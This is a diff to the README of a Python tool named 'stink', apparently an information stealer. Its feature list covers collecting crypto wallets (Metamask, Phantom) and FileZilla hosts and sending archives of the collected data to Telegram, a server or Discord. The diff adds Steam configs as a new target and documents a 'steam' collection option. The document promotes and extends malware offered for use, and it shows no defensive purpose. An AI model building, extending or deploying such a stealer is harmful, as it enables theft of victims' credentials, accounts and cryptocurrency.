@@ -42,6 +42,7 @@ The `stink` already has an impressive functionality that will only expand.
    - Crypto wallets:
        - Metamask
        - Phantom
+   - Steam configs
 3. Support for browser multiprofiles.
 4. Sending an archive of collected data to Telegram / Server / Discord.
 5. Execution in a separate thread.
@@ -97,6 +98,8 @@ if __name__ == '__main__':
   - `filezilla` - collecting FileZilla hosts.
 
   - `wallets` - collecting crypto wallets.
+
+  - `steam` - collecting Steam configs.
 
 
 - `utils` - enables the utilities from the list. Utilities can be imported from `stink.enums.Utils`. Available utilities:
